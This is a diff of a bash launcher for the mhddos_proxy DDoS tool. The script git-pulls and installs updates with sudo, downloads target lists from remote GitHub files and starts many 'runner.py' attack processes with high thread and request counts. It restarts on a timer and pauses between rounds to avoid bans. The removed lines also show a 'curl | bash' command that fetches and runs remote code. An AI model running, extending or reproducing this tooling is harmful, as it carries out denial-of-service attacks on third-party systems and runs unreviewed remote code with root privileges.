@@ -1,65 +1,148 @@
 #!/bin/bash
-##### Use next command in local linux terminal to run this script.
-#  >>>>>   curl -s https://raw.githubusercontent.com/KarboDuck/runner.sh/master/runner.sh | bash  <<<<<
-##### It is possible to pass arguments "num_of_copies" and "restart_interval" to script.
-##### curl -s https://raw.githubusercontent.com/KarboDuck/runner.sh/master/runner.sh | bash -s -- 2 1800 (launch with num_of_copies=2 and restart_interval=1800)
 
-##### To kill script just close terminal window. OR. In other terminal run 'pkill -f python3'. And press CTRL+C in main window.
+restart_interval="20m"
 
-
-
-## Restart script every N seconds (900s = 15m, 1800s = 30m, 3600s = 60m).
-## It allows to download updates for mhddos_proxy, MHDDoS and target list.
-## By default (9m), can be passed as second parameter
-restart_interval="15m"
-
-
-#parameters that passed to python scrypt
-threads="${1:-1000}"
-threads="-t $threads"
-rpc="${2:-200}"
-rpc="--rpc $rpc"
-debug="${3:-}"
-proxy_interval="-p 600"
+ulimit -n 1048576
+# TO DELETE WHEN EVERYTHING WILL BE OKAY WITH ORIGINAL REPO
+#cd ~/mhddos_proxy
+#sudo git checkout 49a4c8b034c2f7a5d3d0548e892414a2ebd30076
+#sudo pip3 install -r requirements.txt
 
 #Just in case kill previous copy of mhddos_proxy
-pkill -f runner.py
-pkill -f ./start.py
+echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Killing all old processes with MHDDoS"
+sudo pkill -e -f runner.py
+sudo pkill -e -f ./start.py
+echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;35mAll old processes with MHDDoS killed\033[0;0m\n"
+# for Docker
+#echo "Kill all useless docker-containers with MHDDoS"
+#sudo docker kill $(sudo docker ps -aqf ancestor=ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest)
+#echo "Docker useless containers killed"
+
+proxy_interval="1200"
+proxy_interval="-p $proxy_interval"
+
+num_of_copies="${1:-1}"
+threads="${2:-3000}"
+if ((threads < 2000));
+then
+	threads=2000
+fi
+
+rpc="${3:-1000}"
+if ((rpc < 1000));
+then
+	rpc=1000
+fi
+
+debug="${4:-}"
+if [ "${debug}" != "--debug" ] && [ "${debug}" != "" ];
+then
+	debug="--debug"
+fi
 
 
 
 # Restart attacks and update targets list every 10 minutes (by default)
-while [[ 1 == 1 ]]
-#echo -e "#####################################\n"
-do
-   # Get number of targets in runner_targets. First 5 strings ommited, those are reserved as comments.
-   list_size=$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets | cat | grep "^[^#]" | wc -l)
-   
-   echo -e "\nNumber of targets in list: $list_size \n"
+while [ 1 == 1 ]
+do	
+	cd ~/mhddos_proxy
 
-   
+
+	num0=$(sudo git pull origin main | grep -c "Already")
+   	echo "$num0"
+   	
+   	if ((num0 == 1));
+   	then	
+		clear
+		echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Running up to date mhddos_proxy"
+	else
+		cd ~/mhddos_proxy
+		clear
+		sudo pip3 install -r requirements.txt
+		echo "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Running updated mhddos_proxy"
+	fi
+	
+	
+	cd ~/auto_mhddos_alexnest
+   	num=$(sudo git pull origin main | grep -c "Already")
+   	echo "$num"
+   	
+   	if ((num == 1));
+   	then	
+		clear
+		echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Running up to date auto_mhddos_alexnest"
+	else
+		cd ~/auto_mhddos_alexnest
+		clear
+		echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Running updated auto_mhddos_alexnest"
+		bash runner.sh $num_of_copies $threads $rpc $debug& # run new downloaded script 
+		#sudo pkill -o -f runner.sh
+		return 0
+		#exit #terminate old script
+	fi
+	#
+   	
+	
+   	# Get number of targets in runner_targets. First 5 strings ommited, those are reserved as comments.
+   	list_size=$(curl -s https://raw.githubusercontent.com/alexnest-ua/targets/main/targets_linux | cat | grep "^[^#]" | wc -l)
+	
+	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Number of targets in list: " $list_size "\n"
+   	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Taking random targets (just not all) to reduce the load on your CPU(processor)..."
+	
+   	if (("$num_of_copies" == "all"));
+	then	
+		if ((list_size > 3)); # takes not more than 3 targets to one attack (to deffend your machine)
+		then
+			random_numbers=$(shuf -i 1-$list_size -n 3)
+		else
+			random_numbers=$(shuf -i 1-$list_size -n $list_size)
+		fi
+	elif ((num_of_copies > list_size));
+	then 
+		if ((list_size > 3)); # takes not more than 3 targets to one attack (to deffend your machine)
+		then
+			random_numbers=$(shuf -i 1-$list_size -n 3)
+		else
+			random_numbers=$(shuf -i 1-$list_size -n $list_size)
+		fi
+	elif ((num_of_copies < 1));
+	then
+		num_of_copies=1
+		random_numbers=$(shuf -i 1-$list_size -n $num_of_copies)
+	else
+		random_numbers=$(shuf -i 1-$list_size -n $num_of_copies)
+	fi
+	
+   	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Random number(s): " $random_numbers "\n"
       
-   # Launch multiple mhddos_proxy instances with different targets.
-   for (( i=1; i<=list_size; i++ ))
-   do
+   	# Launch multiple mhddos_proxy instances with different targets.
+   	for i in $random_numbers
+   	do
             echo -e "\n I = $i"
             # Filter and only get lines that starts with "runner.py". Then get one target from that filtered list.
-            cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets | cat | grep "^[^#]")")
+            cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/alexnest-ua/targets/main/targets_linux | cat | grep "^[^#]")")
            
 
-            echo "full cmd:"
-            echo "$cmd_line $proxy_interval $threads $rpc"
+            echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - full cmd:\n"
+            echo "sudo python3 runner.py $cmd_line $proxy_interval --rpc $rpc -t $threads $debug"
             
             cd ~/mhddos_proxy
-            python3 runner.py $cmd_line $threads $proxy_interval $rpc $debug&
-            echo -e "Attack started. Wait a few minutes for output"
-   done
-   
-   echo -e "\nDDoS is up and Running, next update of targets list in $restart_interval\nSleeping\n"
-   sleep $restart_interval
-   clear
-   echo -e "\nRESTARTING\nKilling old processes..."
-   pkill -f runner.py
-   pkill -f ./start.py
-   echo -e "\nOld processes have been killed - starting new ones"
+            #sudo docker run -d -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest $cmd_line $proxy_interval $rpc
+            sudo python3 runner.py $cmd_line $proxy_interval --rpc $rpc -t $threads $debug&
+            echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[42mAttack started successfully\033[0m\n"
+   	done
+   	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[1;35mDDoS is up and Running, next update of targets list in $restart_interval ...\033[1;0m"
+   	sleep $restart_interval
+	clear
+   	
+   	#Just in case kill previous copy of mhddos_proxy
+   	echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Killing all old processes with MHDDoS"
+   	sudo pkill -e -f runner.py
+   	sudo pkill -e -f ./start.py
+   	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;35mAll old processes with MHDDoS killed\033[0;0m\n"
+	
+   	no_ddos_sleep="$(shuf -i 2-6 -n 1)m"
+   	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m]\033[46mSleeping $no_ddos_sleep without DDoS to protect your machine from ban...\033[0m\n"
+	sleep $no_ddos_sleep
+	echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m]\033[42mRESTARTING\033[0m\n"
 done
